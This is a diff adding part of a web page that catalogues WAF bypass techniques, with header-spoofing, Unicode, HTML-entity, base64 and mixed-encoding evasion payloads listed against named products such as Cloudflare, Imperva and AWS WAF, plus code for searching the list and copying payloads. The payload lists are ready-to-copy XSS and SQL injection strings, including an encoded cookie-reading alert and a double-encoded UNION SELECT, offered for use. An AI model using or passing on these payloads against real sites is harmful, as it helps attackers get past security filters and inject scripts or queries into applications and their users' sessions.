+    desc: "Some WAF policies skip deep inspection for requests that appear to originate from the target site itself, trusting the Referer header as an origin indicator.",
+    payloads: [
+      'Referer: https://target.com/',
+      'Referer: https://target.com/admin/',
+    ],
+    wafs: ['ModSecurity (custom rules)', 'Imperva'],
+  },
+  {
+    id: 'hdr-content-encoding',
+    cat: 'header',
+    name: 'Content-Encoding Abuse',
+    desc: "Sending a gzip-encoded body with Content-Encoding: gzip tricks WAFs that do not decompress before inspection into seeing only compressed bytes, not the embedded payload.",
+    payloads: [
+      'Content-Encoding: gzip\r\n\r\n[gzip-encoded payload body]',
+      'Content-Encoding: deflate\r\n\r\n[deflate-encoded payload]',
+    ],
+    wafs: ['AWS WAF', 'Akamai'],
+  },
+
+  /* ═══════════════ Encoding ═══════════════ */
+  {
+    id: 'enc-unicode-normalization',
+    cat: 'encoding',
+    name: 'Unicode Normalisation Bypass',
+    desc: "Unicode contains lookalike characters (homoglyphs) for ASCII. Some WAFs normalise Unicode before matching; others do not. Submitting a fullwidth or homoglyph character can slip past rules.",
+    payloads: [
+      '＜script＞alert(1)＜/script＞',
+      '<img src=x onerror=alert(1)>',
+    ],
+    wafs: ['ModSecurity', 'Imperva'],
+  },
+  {
+    id: 'enc-html-decimal',
+    cat: 'encoding',
+    name: 'HTML Decimal / Hex Entities',
+    desc: "HTML numeric references (decimal &#60; or hex &#x3C;) are browser-decoded before rendering. A WAF inspecting the raw bytes may not decode them and so miss the payload.",
+    payloads: [
+      '&#60;script&#62;alert(1)&#60;/script&#62;',
+      '&#x3C;img src=x onerror=alert(1)&#x3E;',
+    ],
+    wafs: ['Cloudflare', 'Imperva'],
+  },
+  {
+    id: 'enc-base64-attr',
+    cat: 'encoding',
+    name: 'Base64 in Attributes',
+    desc: "Browsers can execute base64-encoded scripts via eval + atob(). If a WAF inspects only the attribute value for known patterns, the base64 blob is opaque to it.",
+    payloads: [
+      '<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>',
+      '<body onload=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>',
+    ],
+    wafs: ['Cloudflare', 'AWS WAF'],
+  },
+  {
+    id: 'enc-mixed-encoding',
+    cat: 'encoding',
+    name: 'Mixed Encoding Stacking',
+    desc: "Combining multiple encoding layers (URL-encode then HTML-entity-encode) creates a sequence no single normalisation step resolves, but the target application's full decode pipeline does.",
+    payloads: [
+      '%26lt%3bscript%26gt%3b',
+      '%2527%2520UNION%2520SELECT--',
+    ],
+    wafs: ['ModSecurity', 'F5 BIG-IP ASM'],
+  },
+];
+
+
+/* ───────────────────────────────────────────────
+   RENDER
+─────────────────────────────────────────────── */
+const CAT_LABELS = {
+  sqli: 'SQLi', xss: 'XSS', rce: 'RCE',
+  path: 'Path Traversal', http: 'HTTP-Level',
+  header: 'Header Abuse', encoding: 'Encoding',
+};
+
+function esc(s) {
+  return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function renderCard(t) {
+  const wafsHtml = (t.wafs || []).map(w =>
+    `<span class="waf-tag"><span class="waf-tag-label">Tested:</span>${esc(w)}</span>`
+  ).join('');
+
+  const payloadsHtml = (t.payloads || []).map((p, i) => `
+    <div class="payload-row">
+      <code class="bypass-payload" id="pl-${t.id}-${i}">${esc(p)}</code>
+      <button class="copy-payload-btn" onclick="copyPayload('pl-${t.id}-${i}', this)" aria-label="Copy payload">Copy</button>
+    </div>`
+  ).join('');
+
+  return `
+    <div class="technique-card" id="tc-${t.id}" data-cat="${t.cat}" data-name="${esc(t.name.toLowerCase())}" data-desc="${esc(t.desc.toLowerCase())}" data-payloads="${esc(t.payloads.join(' ').toLowerCase())}">
+      <div class="card-header">
+        <div class="card-title">${esc(t.name)}</div>
+        <span class="cat-tag ${t.cat}">${esc(CAT_LABELS[t.cat] || t.cat)}</span>
+      </div>
+      <div class="card-desc">${esc(t.desc)}</div>
+      <div class="payload-list">${payloadsHtml}</div>
+      ${wafsHtml ? `<div class="card-footer">${wafsHtml}</div>` : ''}
+    </div>`;
+}
+
+// Initial render
+const grid = document.getElementById('technique-grid');
+grid.innerHTML =
+  TECHNIQUES.map(renderCard).join('') +
+  '<div class="empty-state" id="empty-state"><div class="empty-icon">🛡</div><p>No techniques match your search or filter.</p></div>';
+
+
+/* ───────────────────────────────────────────────
+   FILTER / SEARCH
+─────────────────────────────────────────────── */
+let activeCat = 'all';
+
+function setCat(btn) {
+  document.querySelectorAll('#cat-chips .chip').forEach(c => c.classList.remove('active'));
+  btn.classList.add('active');
+  activeCat = btn.dataset.cat;
+  applyFilters();
+}
+
+function applyFilters() {
+  const q = document.getElementById('search').value.toLowerCase().trim();
+  let visible = 0;
+
+  TECHNIQUES.forEach(t => {
+    const el = document.getElementById('tc-' + t.id);
+    if (!el) return;
+
+    const matchCat = activeCat === 'all' || t.cat === activeCat;
+    const matchQ = !q ||
+      t.name.toLowerCase().includes(q) ||
+      t.desc.toLowerCase().includes(q) ||
+      t.payloads.some(p => p.toLowerCase().includes(q)) ||
+      (t.wafs || []).some(w => w.toLowerCase().includes(q)) ||
+      (CAT_LABELS[t.cat] || '').toLowerCase().includes(q);
+
+    const show = matchCat && matchQ;
+    el.classList.toggle('hidden', !show);
+    if (show) visible++;
+  });
+
+  document.getElementById('count-label').innerHTML =
+    `Showing <strong>${visible}</strong> of <strong>${TECHNIQUES.length}</strong> techniques`;
+
+  const empty = document.getElementById('empty-state');
+  if (empty) empty.classList.toggle('visible', visible === 0);
+}
+
+
+/* ───────────────────────────────────────────────
+   COPY PAYLOAD
+─────────────────────────────────────────────── */
+function copyPayload(id, btn) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  const text = el.textContent || '';
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = 'Copy';
+      btn.classList.remove('copied');
+    }, 1600);
+  }).catch(() => {
+    /* fallback */
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    ta.remove();
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1600);
+  });
+  if (typeof showToast === 'function') showToast('Payload copied', 'success');
+}
+
+
+/* ───────────────────────────────────────────────
+   INIT
+─────────────────────────────────────────────── */
+applyFilters();
+
+// Keyboard shortcut: / to focus search
+document.addEventListener('keydown', e => {
+  if (e.key === '/' && document.activeElement.tagName !== 'INPUT') {
+    e.preventDefault();
+    document.getElementById('search').focus();
+  }
+});
+</script>
+</body>
+</html>
